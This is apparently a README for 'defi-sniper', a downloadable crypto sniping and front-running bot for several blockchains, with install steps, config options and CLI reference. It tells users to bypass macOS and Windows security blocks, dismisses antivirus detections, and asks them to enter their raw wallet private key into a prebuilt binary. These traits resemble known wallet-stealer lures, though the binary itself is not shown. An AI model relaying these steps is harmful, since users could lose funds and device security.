<div align="center">
      <p align="center">
An open-source defi sniper.

![GitHub release (latest by date)](https://img.shields.io/github/v/release/earteaga88/defi-sniper) [![Github All Releases](https://img.shields.io/github/downloads/earteaga88/defi-sniper/total.svg)]() [![build](https://github.com/earteaga88/defi-sniper/actions/workflows/build.yml/badge.svg)](https://github.com/earteaga88/defi-sniper/actions/workflows/build.yml)
[![oclif](https://img.shields.io/badge/cli-oclif-brightgreen.svg)](https://oclif.io)

**defi-sniper** is free to download. 

**NEW** Community telegram group: https://t.me/opensniper

**Premium Services Now Available**

While defi-sniper is free and open-source, if you want the best results you need access to the fastest RPC nodes available. 

A premium version of defi-sniper is available that utilizies our private nodes. Reach out to @spacemonk88 on Telegram for pricing and availability.

![defi-sniper](https://user-images.githubusercontent.com/93244980/166409860-94ee8e71-933c-46d3-b1ca-6564f16d37ca.png)

        
</p>
</div>
        <hr>


**Donation Address:** 0x7762b7aeaa3105dc63d98e860c8cdca02cb08065


<hr>


**Documentation** 
See the documentation site for detailed descriptions of all features and options.

https://earteaga88.github.io/defi-sniper/

# Table of Contents
<!-- toc -->
* [Supported Blockchains](#supported-blockchains)
* [Features](#features)
* [Security](#security)
* [Installation](#installation)
* [Quickstart](#quickstart)
* [Settings](#settings)
* [Commands](#commands)
* [Feature Requests & Bug Reporting](#feature-requests--bug-reporting)
<!-- tocstop -->

# Supported Blockchains
* Ethereum
* Cronos
* Binance Smart Chain
* Polygon (Matic)
* Fantom Opera
* KCC
* Avalanche

#### Exchange Availability
* Uniswap
* SushiSwap
* Mad Meerkat Finance
* PancakeSwap
* ApeSwap
* QuickSwap
* SpookySwap
* SpiritSwap
* KoffeeSwap
* KuSwap
* Trader Joe

# Features
* Telegram Sniper
* Mempool Sniper
* Instant Sniper
* CoinMarketCap/CoinGecko Listing Sniper
* PancakeSwap Prediction Bot
* DxSale/PinkSale Presale Bot

# Security

**Transparent Builds**

defi-sniper is the only bot with full transparency in mind. 

Binaries are built using GitHub Actions and published directly to a release. This happens during the "Release" step of the builds. 

See example here: https://github.com/earteaga88/defi-sniper/runs/6201209436?check_suite_focus=true#step:9:1
![release](https://user-images.githubusercontent.com/93244980/165802350-2dcc0278-fa64-4202-a40c-8597291b0381.png)

**Code Scanning**

Dependabot constantly monitors for out-of-date dependency packages.

defi-sniper is also scanned with multiple security products using GitHub Actions.
* Snyk
* OSSR
* CodeQL

# Installation

Binaries are available for Linux (x64, arm), macOS (x64, arm), and Windows (x64). Check the [releases page](https://github.com/earteaga88/defi-sniper/releases/) for the latest version.

## Linux

Open Terminal.

`curl -L https://github.com/earteaga88/defi-sniper/releases/latest/download/defi-sniper-linux-x64 -o defi-sniper`

`chmod +x defi-sniper`

## macOS

Open Terminal.

`curl -L https://github.com/earteaga88/defi-sniper/releases/latest/download/defi-sniper-macos-x64 -o defi-sniper`

`chmod +x defi-sniper`

If you try to run `./defi-sniper` at this point, you will get a message that macOS has blocked it.

To fix that, go to System Preferences and click Security & Privacy. Click the Open Anyway button in the General pane.

<img src="https://user-images.githubusercontent.com/100382691/156895989-cee7cc92-6c79-4c8d-81d6-f561d3e63df9.png" width="500">

Now you should be able to execute `./defi-sniper` in your Terminal.

## Windows

Download the latest Windows release.

https://github.com/earteaga88/defi-sniper/releases/latest/download/defi-sniper-win-x64.exe

After downloading, you can optionally rename it from "defi-sniper-win-64" to defi-sniper. It will work either way.

**If you get a message that defi-sniper was blocked by SmartScreen/Defender:**

Option 1:
- Click "More Info"
- Click the "Run anyway" button.

Option 2:
- Right click on defi-sniper and go to properties
- Check the box that says "unblock" and click OK.

You should now be able to run defi-sniper.

**Note:** ~~VirusTotal is giving false positives on the Windows binary. THIS IS A FALSE POSITIVE and known issue with the 'pkg' npm package used to compile the code. See vercel/pkg#1540.~~ It seems VirusTotal is no longer reporting problems with pkg. https://www.virustotal.com/gui/file/b02a7205040b82b75e7eecf5a84b3aea357288f2138e011f3db797f728e085b6/detection

# Quickstart

### Interactive Mode

Simply running defi-sniper by double clicking will start it in interactive mode.

### CLI Mode

In Terminal (Linux/macOS) or CMD prompt (Windows) change your directory to where you downloaded defi-sniper.

` cd ~/Downloads`

Configure your wallet by using the CLI or by editing the ~/Documents/defi-sniper-cofigs/wallets.json file.

`./defi-sniper wallet private_key [paste key]`

Start defi-sniper.

`./defi-sniper start`

# Settings

A defi-sniper-configs folder will be created in your Documents. Inside you will find three JSON files that contain various settings.

* config.json
* nodeConfig.json
* wallets.json

## wallets.json

`private_key`

Enter the private key (64 characters, not the seed phrase) of your wallet that you wish to use defi-sniper with. 

`additional_private_keys`

Reserved for future use.

## config.json

The configs.json file is located in the defi-sniper-configs folder in your Documents.

`amt_mode`

Use USD, ETH, or TKN to configure the mode of the AMOUNT option. By setting USD will value in U.S. dollars, ETH will value in the native Blockchain token (e.g. ETH, BNB, etc.), and TKN will be in the amount of tokens itself.

When using TKN mode, please make sure you have more than enough native balance to prevent "insufficient funds" error, as defi-sniper is unable to estimate the native spending.

`amount`

Enter the amount for each of your transaction.

`slippage`

Enter the BURN (not price movement) tolerance for your transaction.

E.g. If you were supposed to receive 1000 tokens from the swap, and have SLIPPAGE configured at 75, minimally you must receive 250 tokens back, otherwise it will be rejected by the exchange router.

It is highly recommended to keep this configured between 98 and 100.

`mempool_block_delay`

The number of blocks to wait after the addLiquidity transaction is detected.

`iteration`

Enter the number of iteration you wish to perform. Each iteration will weight the AMOUNT parameter. E.g. If you have 0.25 in AMOUNT, and 2 in ITERATION, defi-sniper will perform 0.25 ETH x 2, totaling 0.5 ETH.

`gas_price`

This is to configure the gas price of your transactions. You may also use 0 for defi-sniper to calculate the gas automatically; 2x of the current network gas.

`priority_gas`

This is to configure the priority gas of your Ethereum Mainnet transactions.

`honeypot_check`

Use true or false to configure if defi-sniper should scan the contract address with RugDoc's Honeypot Checker before executing the swap transaction.

`block_severe_fee`

Use true or false to configure if defi-sniper should block severely high trading fee (over 50%) tokens. The HONEYPOT_CHECK option must be enabled for this to work.

`delay_execution`

This configures the number of block to skip before executing the swap transaction.

`delay_iteration`

This configures the delay in seconds between each iteration.

`rug_pull_check`

Use true or false to configure if defi-sniper should listen to removeLiquidity() related transaction. If such a transaction is detected, defi-sniper will TRY to front-run the transaction. 

`sell_management`

Use true or false to configure if defi-sniper should monitor the live value and sell options after the swap transactions. 

## nodeConfig.json

This file contains the websocket and RPC node URLs for each blockchain.

## Telegram

The telegram.json file is located in the defi-sniper-configs folder in your Documents.

In order for Telegram Scanner and CMC/CG Fastest Alerts Telegram to work, defi-sniper needs to log in to your Telegram account.

To do so, you would need to provide API parameters of your account. Follow these steps:

* Log in to Telegram Core

* Go to API Development Tools and fill in the form as follows:
    * App title - deficli
    * Short name - deficli
    * URL -
    * Platform - Other
    * Description -

* Click on the "Create application" button, and you should see the app configuration.

* Copy the app_id and app_hash, and paste it to your telegram.json file.

# Commands
<!-- commands -->
* [`defi-sniper autocomplete [SHELL]`](#defi-sniper-autocomplete-shell)
* [`defi-sniper config [KEY] [VALUE]`](#defi-sniper-config-key-value)
* [`defi-sniper help [COMMAND]`](#defi-sniper-help-command)
* [`defi-sniper nodes [KEY] [VALUE]`](#defi-sniper-nodes-key-value)
* [`defi-sniper start`](#defi-sniper-start)
* [`defi-sniper wallet [KEY] [VALUE]`](#defi-sniper-wallet-key-value)

## `defi-sniper autocomplete [SHELL]`

display autocomplete installation instructions

```
USAGE
  $ defi-sniper autocomplete [SHELL] [-r]

ARGUMENTS
  SHELL  shell type

FLAGS
  -r, --refresh-cache  Refresh cache (ignores displaying instructions)

DESCRIPTION
  display autocomplete installation instructions

EXAMPLES
  $ defi-sniper autocomplete

  $ defi-sniper autocomplete bash

  $ defi-sniper autocomplete zsh

  $ defi-sniper autocomplete --refresh-cache
```

_See code: [@oclif/plugin-autocomplete](https://github.com/oclif/plugin-autocomplete/blob/v1.2.0/src/commands/autocomplete/index.ts)_

## `defi-sniper config [KEY] [VALUE]`

manage configuration

```
USAGE
  $ defi-sniper config [KEY] [VALUE] [-h] [-d]

ARGUMENTS
  KEY    (amt_mode|amount|slippage|mempool_block_delay|iteration|gas_price|priority_gas|honeypot_check|block_severe_fee|
         delay_execution|delay_iteration|rug_pull_check|sell_management|telegram.api_id|telegram.api_hash)
  VALUE  value

FLAGS
  -d, --delete  delete?
  -h, --help    show CLI help

DESCRIPTION
  manage configuration
```

_See code: [dist/commands/config.ts](https://github.com/earteaga88/defi-sniper/blob/v1.1.1/dist/commands/config.ts)_

## `defi-sniper help [COMMAND]`

Display help for defi-sniper.

```
USAGE
  $ defi-sniper help [COMMAND] [-n]

ARGUMENTS
  COMMAND  Command to show help for.

FLAGS
  -n, --nested-commands  Include all nested commands in the output.

DESCRIPTION
  Display help for defi-sniper.
```

_See code: [@oclif/plugin-help](https://github.com/oclif/plugin-help/blob/v5.1.12/src/commands/help.ts)_

## `defi-sniper nodes [KEY] [VALUE]`

manage EVM node configuration

```
USAGE
  $ defi-sniper nodes [KEY] [VALUE] [-h] [-d]

ARGUMENTS
  KEY    (eth.websockets|eth.rpc|eth_rinkeby.websockets|eth_rinkeby.rpc|cro.websockets|cro.rpc|bsc.websockets|bsc.rpc|ma
         tic.websockets|matic.rpc|ftm.websockets|ftm.rpc|kcs.websockets|kcs.rpc|avax.websockets|avax.rpc)
  VALUE  value

FLAGS
  -d, --delete  delete?
  -h, --help    show CLI help

DESCRIPTION
  manage EVM node configuration
```

_See code: [dist/commands/nodes.ts](https://github.com/earteaga88/defi-sniper/blob/v1.1.1/dist/commands/nodes.ts)_

## `defi-sniper start`

run bot

```
USAGE
  $ defi-sniper start

DESCRIPTION
  run bot

EXAMPLES
  $ defi-sniper start
```

_See code: [dist/commands/start.ts](https://github.com/earteaga88/defi-sniper/blob/v1.1.1/dist/commands/start.ts)_

## `defi-sniper wallet [KEY] [VALUE]`

add or remove wallet

```
USAGE
  $ defi-sniper wallet [KEY] [VALUE] [-h] [-d]

ARGUMENTS
  KEY    (private_key|additional_private_keys)
  VALUE  value

FLAGS
  -d, --delete  delete?
  -h, --help    show CLI help

DESCRIPTION
  add or remove wallet
```

_See code: [dist/commands/wallet.ts](https://github.com/earteaga88/defi-sniper/blob/v1.1.1/dist/commands/wallet.ts)_
<!-- commandsstop -->
<hr>

# Feature Requests & Bug Reporting

Please submit an issue to this repo and include as much information as possible. For feature requests, also reach out to me on Telegram with your idea. If I like it and can use it myself, I'll look into it. If not, we can negotiate a price for me to code it.

<hr>

**Contributors**

[![Contributors Display](https://badges.pufler.dev/contributors/earteaga88/defi-sniper?size=50&padding=5&bots=true)](https://badges.pufler.dev)
